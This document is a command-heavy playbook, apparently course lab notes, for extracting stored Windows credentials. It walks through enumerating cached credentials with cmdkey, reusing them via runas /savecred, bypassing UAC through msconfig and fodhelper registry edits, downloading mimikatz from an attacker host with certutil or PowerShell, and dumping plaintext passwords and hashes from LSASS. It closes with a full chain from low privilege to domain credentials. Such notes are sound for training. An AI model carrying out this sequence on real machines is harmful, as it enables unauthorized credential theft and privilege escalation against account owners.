# Windows Credential Manager Extraction Playbook

**Tactic:** Credential Access (TA0006)  
**Technique:** Credentials from Password Stores (T1555.004)

---

## Quick Reference

| Goal | Command |
|------|---------|
| Enumerate stored creds | `cmdkey /list` |
| Reuse stored cred | `runas /savecred /user:DOMAIN\USER cmd` |
| UAC bypass | `msconfig` → Tools → Command Prompt |
| Extract from memory | `mimikatz # sekurlsa::credman` |

---

## Enumeration Phase

### 1. Check for Stored Credentials
```cmd
cmdkey /list
```

**Look for:**
- `Domain:interactive=DOMAIN\username` → Domain logon credential
- `WindowsLive:target=...` → Microsoft account
- `LegacyGeneric:target=onedrive.live.com` → Web credential

**Output example:**
```
Target: Domain:interactive=SRV01\mcharles
Type: Domain Password
User: SRV01\mcharles

Target: LegacyGeneric:target=onedrive.live.com
Type: Generic
User: mcharles@domain.local
```

### 2. Check Credential Vault Locations
```cmd
dir %UserProfile%\AppData\Local\Microsoft\Credentials\ /s
dir %UserProfile%\AppData\Roaming\Microsoft\Vault\ /s
```

---

### Critical Behavior: Lazy Loading

**Important:** Windows uses **lazy loading** for user profiles. After `runas`, credentials may not immediately appear in `sekurlsa::credman`.

**Why:** Credential Manager vaults are encrypted on disk and only loaded into LSASS memory when accessed.

**Solution — Always enumerate first:**
```cmd
# Step 1: Force profile/vault loading
cmdkey /list

# Step 2: Now extract from LSASS cache
mimikatz # sekurlsa::credman
```

**Without `cmdkey /list` first:** Recently-created sessions may show empty or partial results in `sekurlsa::credman` because the vault hasn't been loaded into memory yet.

**Alternative — Direct disk access (no lazy loading issue):**
```cmd
mimikatz # dpapi::cred /in:"C:\Users\USER\AppData\Local\Microsoft\Credentials\FILE"
```
This reads encrypted files directly, bypassing LSASS cache entirely.

---

## Exploitation: Reuse Without Password

**Scenario:** Found `Domain:interactive=DOMAIN\user` in `cmdkey /list`

```cmd
runas /savecred /user:DOMAIN\username cmd
```

**What happens:**
- Spawns new CMD as target user
- Uses cached credential — **no password prompt**
- Works even if you don't know the password

**Verify:**
```cmd
whoami
whoami /groups | findstr /i "admin"
```

---

## Privilege Escalation: UAC Bypass

**Scenario:** You're an admin but need elevated shell (high integrity)

**Technique: msconfig**
```cmd
msconfig
# → Tools tab → Command Prompt → Launch
```

**Result:** Elevated cmd.exe without UAC prompt

**Verify elevation:**
```cmd
whoami /groups | findstr "S-1-16-12288"
# Look for: Mandatory Label\High Mandatory Level
```

**Alternative: fodhelper** (if msconfig blocked)
```cmd
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe" /f
fodhelper.exe
```

---

## Credential Extraction: Mimikatz

### Step 1: Transfer mimikatz (if not present)
```cmd
# From elevated shell:
cd %TEMP%
certutil -urlcache -split -f http://ATTACKER_IP/mimikatz.exe
# or
powershell -c "Invoke-WebRequest -Uri http://ATTACKER_IP/mimikatz.exe -OutFile mimikatz.exe"
```

### Step 2: Extract from LSASS Memory
```cmd
mimikatz.exe
privilege::debug
sekurlsa::credman
```

**Output includes:**
```
Authentication Id : 0 ; 640372
User Name : mcharles
Domain : SRV01
credman :
 [00000000]
 * Username : mcharles@domain.local
 * Domain : onedrive.live.com
 * Password : PLAINTEXT_PASSWORD_HERE
```

**Alternative dumps:**
```
sekurlsa::logonpasswords    # NTLM hashes
sekurlsa::msv               # MSV1_0 credentials
sekurlsa::kerberos          # Kerberos tickets
sekurlsa::wdigest           # WDigest credentials
```

---

## Key Distinctions

| Type | Storage | Extraction Method |
|------|---------|-------------------|
| **Domain Credentials** | LSASS (logon session) | `sekurlsa::logonpasswords` |
| **Credential Manager** | LSASS (CredMan) | `sekurlsa::credman` |
| **Web Credentials** | Vault files + LSASS | `sekurlsa::credman` or `dpapi::vault` |

---

## Defensive Considerations

**Credential Guard Enabled?**
```powershell
Get-WmiObject -Class "Win32_DeviceGuard" -Namespace "Root\CIMv2\Security\MicrosoftTpm"
```

If Credential Guard is active:
- `sekurlsa` modules fail against LSASS
- Must use `dpapi::` offline decryption with master keys
- Requires dumping `C:\Users\USER\AppData\Roaming\Microsoft\Protect\` and cracking

---

## Attack Chain Example

**From low-priv user to domain creds:**
```
sadams (low priv)
  ↓ cmdkey /list
Found: SRV01\mcharles cached
  ↓ runas /savecred /user:SRV01\mcharles cmd
Now: mcharles (medium priv, but not elevated)
  ↓ msconfig → Tools → CMD
Now: mcharles (high integrity / elevated)
  ↓ mimikatz # sekurlsa::credman
Extracted: mcharles@domain.local / OneDrive / PLAINTEXT_PASSWORD
```

---

## References

- MITRE ATT&CK: T1555.004 — Credentials from Password Stores: Windows Credential Manager
- mimikatz: `sekurlsa::credman` — https://github.com/gentilkiwi/mimikatz
- SharpDPAPI: https://github.com/GhostPack/SharpDPAPI
- Windows Credential Guard: https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/

---

**Created:** 2026-04-17  
**Source:** HTB Academy — Password Attacks / Attacking Windows Credential Manager
